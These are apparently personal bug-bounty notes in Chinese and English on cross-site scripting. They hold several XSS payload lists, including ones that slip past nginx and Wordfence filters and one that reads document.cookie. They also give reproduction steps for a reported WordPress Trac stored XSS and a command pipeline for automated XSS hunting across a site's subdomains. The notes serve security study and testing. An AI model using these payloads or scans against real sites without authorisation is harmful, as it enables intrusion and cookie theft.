# web 攻击： xss

https://www.cgisecurity.com/xss-faq.html

Almost all XSS Payloads. xss大全
https://github.com/irfan-knr/KNR-XSS-Payloads

@SamuelAnttila ’s amazing XSS cheatsheet. It covers wide range of topics. His story is as incredible as he is. Thanks for all the advice :) 
https://netsec.expert/posts/xss-in-2021/

https://hackerone.com/reports/643908
I found a stored xss @ https://core.trac.wordpress.org/
Steps:
Go to https://core.trac.wordpress.org/ and login. (open new private window and login with another account)
Go to https://core.trac.wordpress.org/newticket and set a summary and description.
Select a Workflow Keyword and click manual. Paste the payload: "><svg/onload=alert(document.domain)>
Click enter button and click Create Ticket button. Now, you will see xss alert. Copy the url and go to private window. Go to url and you will see xss alert.
PoC: https://youtu.be/Nyt1op_73vs
Impact: Stealing cookies

XSS payload to keep on your notes:

<script>alert(1)</script> -> nginx block
"><img src=x onerror=alert(1)> -> Wordfence block
ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6 -> successful execution

Reflected xss successfull payload for me:

1.<b onmouseover=alert('Wufff!')>click me!</b>
2."><script>propmt("mamunwhh")</script>
3."><script>alert(document.cookie)</script>
4. /><svg src=x onload=confirm("1337");>

Brute Logic
@brutelogic
·
2019年6月12日
Here's a small #XSS list for manual testing (main cases, high success rate).

"><img src onerror=alert(1)>
"autofocus onfocus=alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
javascript:alert(1)

Try it on:
- URL query, fragment & path;
- all input fields.


 Ramadan Mubarak Smiling face with 3 hearts
       ALLHUMDULILLAH

BUG : HTML INJECTION to XSS

1) try : <a href="https://evil.com")>click</a>
2) HTML injection successfully working.
3) Now try escalate to XSS : <a href=javascript:alert('Fauzan_hacker')>click</a>

## TOOLS

### burpsuite xss-validator


burpsuite检测xss漏洞 burpsuite实战指南
https://cloud.tencent.com/developer/article/1353325
如何使用开源组件解决web应用中的XSS漏洞
https://t0data.gitbooks.io/mysecuritybook/content/chapter1.html


#### 检查

评论：
1 好像是无法自动识别的，只是帮着发而以，可能存储型的好一些
2 360一些用url也无法触发
Intruder组件根据Grep Phrase标志区分是否存在漏洞？怎么实现？

[2021Kali系列 -- BurpSuite(XSS插件)](https://zhuanlan.zhihu.com/p/364017983)

[使用Burp、PhantomJS进行XSS检测](https://t0data.gitbooks.io/burpsuite/content/chapter19.html)

extender -> BAppStore 'XSS VALIDATOR'

https://github.com/portswigger/xss-validator

https://phantomjs.org/download.html

https://github.com/pmiaowu/BurpReflectiveXssMiao

### x5s: fiddler　插件，都是１０年左右的

http://xss.codeplex.com x5s XSS and Unicode transformations security testing assistant
https://www.security-database.com/toolswatch/x5s-Beta-released-Automated-XSS.html

https://github.com/infoslack/awesome-web-hacking

https://twitter.com/noisy_hacker/status/1380487731701108741
Automated XSS Hunting in All Domains & Subdomains  #infosec  #bugbounty  #bugbountytips

Google：automated xss

![](images/2021-04-14-11-54-45.png)
1 amass enum -d twitter 收集子域名到txt
2 paramspider 目录： xargs -a domains.txt -I@ sh -c 'python3 paramspider.py -d @ -l high'
3 获取输出 
4 合并 cat *.txt > twitter.txt
  wc -l twitter.txt
5 cat twitter.txt | Gxss -p surya | dalfox pipe --mining-dict ./Arjun/arjun/db/params.txt --skip-bav

tools:
[amass](https://github.com/OWASP/Amass)
  In-depth Attack Surface Mapping and Asset Discovery
[paramspider](https://github.com/devanshbatham/ParamSpider)
  Mining parameters from dark corners of Web Archives
[Gxss](https://github.com/KathanP19/Gxss)
  A tool to check a bunch of URLs that contain reflecting params.
[dalfox](https://github.com/hahwul/dalfox)
   🌘🦊 DalFox(Finder Of XSS) / Parameter Analysis and XSS Scanning tool based on golang
   https://latesthackingnews.com/2021/03/08/dalfox-an-automated-xss-finder/

Automating XSS using Dalfox, GF and Waybackurls
https://infosecwriteups.com/automating-xss-using-dalfox-gf-and-waybackurls-bc6de16a5c75

Chrome 插件 Vue.js devtools UXSS
https://www.pwnwiki.org/index.php?title=Chrome_%E6%8F%92%E4%BB%B6_Vue.js_devtools_UXSS